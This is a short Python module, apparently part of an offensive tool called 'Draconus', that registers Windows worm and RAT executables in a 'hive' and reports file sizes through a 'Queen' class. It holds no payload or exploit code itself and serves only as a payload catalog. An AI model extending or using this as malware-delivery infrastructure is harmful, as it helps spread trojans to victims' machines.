import os

# file names of worms
FILE_WORM = 'worm-win7.exe'
FILE_RAT = 'rat-win7.exe'

# types of tools (viruses, rats, worms, etc.)
# Draconus identify types of worms
TYPE_WORM = 'WORM'
TYPE_RAT = 'RAT'

hive_path = os.path.dirname(__file__)

# get file size
def get_size(worm):
    stats = os.stat(f'{hive_path}/{worm}')
    file_len = str(stats.st_size)
    return file_len


class Worms:
    def __init__(self, type_worm, file_worm):
        self.type = type_worm
        self.file = file_worm
        self.path = f'{hive_path}/{self.file}'
        self.length = get_size(self.file)




WORMS = {TYPE_RAT : Worms(TYPE_RAT, FILE_RAT)}


class Queen:
    def __init__(self):
        self.RAT = WORMS[TYPE_RAT]
        print('[QUEEN] Hive is ready !')

    def __repr__(self):
        return f'[QUEEN] Hive have: {list(WORMS.keys())}'


###### TEST
